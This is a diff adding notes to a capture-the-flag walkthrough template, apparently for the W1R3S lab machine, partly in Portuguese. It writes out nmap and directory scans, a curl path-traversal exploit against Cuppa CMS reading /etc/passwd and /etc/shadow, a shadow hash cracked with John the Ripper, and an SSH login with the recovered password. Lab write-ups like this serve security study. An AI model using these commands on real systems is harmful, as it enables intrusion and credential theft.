@@ -8,6 +8,19 @@ Setup your virtual machine and network configuration.
 Perform Nmap scan to identify open ports and services.
 Analyze the services running on the target machine.
 
+netdiscover -r <10.10.10.0/24>
+
+nmap -sV -v -Pn <10.10.10.6>
+nmap -sC -A -p- -Pn <10.10.10.6>
+
+Scan Results: bash
+
+Service Info:
+
+Hosts: The, JOY.localdomain, 127.0.1.1, JOY
+OS: Linux
+CPE: cpe:/o:linux:linux_kernel
+
 
 3. Enumeration
 Enumerate services such as FTP, HTTP, SSH, etc.
@@ -18,26 +31,70 @@ Look for valuable files and potential weaknesses.
 Identify potential vulnerabilities based on the reconnaissance and enumeration.
 Search for public exploits, misconfigurations, or weak service versions.
 
+gobuster dir -u http://10.10.10.6 -w /usr/share/dirb/wordlists/big.txt  
+
+dirb http://10.10.10.6 -d /usr/share/wordlist/dirb 
+
+Service Info:
+Cuppa CMS 
+/adminstrator
+
+http://10.10.10.6/administrator/installation/ Files Found: Cuppa CMS
 
 5. Exploitation
 Exploit vulnerabilities to gain access to the system.
 Use tools like Metasploit, Hydra, or custom scripts.
+
+curl -s --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://10.10.10.12/administrator/alerts/alertConfigField.php?
+curl -s --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://10.10.10.12/administrator/alerts/alertConfigField.php?
+
+Procure pelas hashes usuarios senhas.
+
+ w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
+
+vi <wires.txt> cole dentro do editor
+Use os comando para sair e salvar
+esc
+:wq 
+
+
+john wires.txt
+john  --format=raw-md5 --wordlist=wordlists hash
+
+Se caso mostrar isso:
+john mq06                                                    
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
+No password hashes left to crack (see FAQ)
+
+faça isso:
+john --show  mq06.txt
+w1r3s:computer:17567:0:99999:7:::
+
+1 password hash cracked, 0 left
+
+ssh w1r3s@10.10.10.6
+senha:computer
 
 
 6. Privilege Escalation
 Attempt to escalate privileges from a limited user to root.
 Explore file permissions, configuration files, and environment variables.
 
+No need
+
 
 7. Post-Exploitation
 Maintain access, collect additional flags, or prepare for further exploitation.
 Investigate further vulnerabilities and opportunities for additional access.
 
+No need
 
 8. Flag Collection
 Locate and capture flags (usually text files or output from certain commands).
 Flag collection might be in different formats (e.g., flag.txt or output from a successful command).
 
+don't has
 
 9. Conclusion
 Summarize your successful exploitation.
